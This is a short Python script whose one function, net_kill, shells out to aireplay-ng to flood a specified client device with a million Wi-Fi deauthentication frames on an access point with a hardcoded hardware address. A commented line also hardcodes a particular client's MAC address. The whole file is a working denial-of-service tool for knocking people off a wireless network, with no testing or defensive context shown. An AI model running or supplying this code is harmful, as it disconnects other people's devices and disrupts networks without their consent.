import subprocess

def net_kill(target_mac):
    # cmd = 'aireplay-ng --deauth 1000000 -c A4:83:E7:8D:11:8A -a 70:0B:01:EC:52:F1 wlan0'
    cmd = f'aireplay-ng --deauth 1000000 -c {target_mac} -a 70:0B:01:EC:52:F1 wlan0'

    process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()

    print(output)
    print(error)


